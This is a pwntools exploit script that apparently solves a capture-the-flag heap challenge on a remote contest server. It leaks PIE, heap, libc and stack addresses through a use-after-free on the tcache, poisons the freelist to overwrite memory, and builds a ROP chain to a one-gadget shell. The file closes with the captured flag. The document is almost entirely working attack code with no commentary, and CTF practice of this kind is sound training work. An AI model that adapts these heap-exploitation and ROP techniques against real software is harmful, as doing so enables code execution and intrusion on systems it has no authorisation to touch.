from pwn import *
import warnings


def add(size,data):
    p.sendlineafter(">","1")
    p.sendlineafter(":",str(size))
    p.sendafter(":",data)

def edit(idx,data,cool = False):
    p.sendlineafter(">","2")
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":","0")

    if not cool:
        p.recvuntil("wrong guess ")
        rand = int(p.recvline().strip())
        p.sendlineafter(">","2")
        p.sendlineafter(":",str(idx))
        p.sendlineafter(":",str(rand))
        p.sendafter(":",data)
    else:
        p.sendafter(":",data)

def show(idx,cool=False):
    p.sendlineafter(">","3")
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":","0")
    if not cool:
        p.recvuntil("wrong guess: ")
        rand = int(p.recvline().strip())
        p.sendlineafter(">","3")
        p.sendlineafter(":",str(idx))
        p.sendlineafter(":",str(rand))
    else:
        pass

def delete(idx):
    p.sendlineafter(">","4")
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":","0")
    p.recvuntil("wrong guess ")
    rand = int(p.recvline().strip())
    
    p.sendlineafter(">","4")
    p.sendlineafter(":",str(idx))
    p.sendlineafter(":",str(rand))

elf = context.binary = ELF("chall")
libc = elf.libc
# p = process()
p = remote("pwn.blitzhack.xyz", 4566)



# leak pie 
p.sendlineafter(">","9999")
p.sendline("taki")
p.sendline("-") 
p.recvuntil("ge: ")
p.recvuntil("ge: ")
pie_leak = int(p.recvuntil(" ").strip())
print("arr addr",hex(pie_leak))

elf.address = pie_leak - 0x4060
print("elf.address",hex(elf.address))



# fill tcache, uaf
add(0x30,b"A" * 0x17 + b"\n")
for i in range(7):
    print(i)
    edit(0,"b" * 16)
    delete(0)




# leak heap, and point freelist to our array 
add(0x30,b"B" * 0x17)
delete(1)
show(1)
p.recvuntil("ta: \"")
heap_leak = u64(p.recvline().strip()[:-1].ljust(8,b"\x00"))
print("heap_leak",hex(heap_leak))


edit(1,p64((pie_leak + 0x60) ^ heap_leak))


# now we controle 2
add(0x41,b"B" * 0x17) # 2
add(0x30,"A") # 3
add(0x30,p64(elf.got.atoi)) # 4

# leak libc
show(2,True)
p.recvuntil("ta: \"")
libc_leak = u64(p.recvline().strip()[:-1].ljust(8,b"\x00"))
print("libc_leak",hex(libc_leak))
libc.address = libc_leak - libc.sym.atoi
print("libc.address",hex(libc.address))





# leak stack
edit(4,p64(libc.sym.environ)) # 4
show(2,True)
p.recvuntil("ta: \"")
stack_leak = u64(p.recvline().strip()[:-1].ljust(8,b"\x00"))
print("stack_leak",hex(stack_leak))

# happy roping

rop = ROP(libc)
edit(4,p64(stack_leak - 0x150)) # 4
# gdb.attach(p)
input("click")
edit(2,flat([
    rop.rax.address,0,
    rop.rbx.address,0,
    libc.address + 0x583ec,
]),True)

p.interactive()

# Blitz{f4stb1n_dr1ll_thr0ugh_m3m0ry_b4rr13r}